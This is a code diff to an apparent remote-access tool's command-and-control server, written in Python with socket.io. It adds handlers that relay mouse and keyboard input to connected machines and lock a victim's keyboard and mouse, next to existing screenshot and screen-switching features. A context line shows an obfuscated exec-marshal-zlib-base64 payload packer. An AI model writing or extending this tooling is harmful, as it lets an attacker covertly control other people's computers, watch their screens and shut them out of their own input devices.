@@ -32,6 +32,11 @@ class C2:
         self.sio.on("screenshot", self.screenshot_taken)
         self.sio.on("switch_screen", self.switch_screen)
 
+        self.sio.on("mouse_input", self.mouse_input)
+        self.sio.on("keyboard_input", self.keyboard_input)
+        self.sio.on("lock_keyboard", self.lock_keyboard)
+        self.sio.on("lock_mouse", self.lock_mouse)
+
         print(f"Current time: {datetime.datetime.utcnow()}")
 
     def get_client_ip(self, environ):
@@ -330,3 +335,15 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
     def switch_screen(self, sid, data):
         self.sio.emit("switch_screen", data)
+
+    def mouse_input(self, sid ,data):
+        self.sio.emit("mouse_input", data)
+
+    def keyboard_input(self, sid ,data):
+        self.sio.emit("keyboard_input", data)
+
+    def lock_keyboard(self, sid ,data):
+        self.sio.emit("lock_keyboard", data)
+
+    def lock_mouse(self, sid ,data):
+        self.sio.emit("lock_mouse", data)
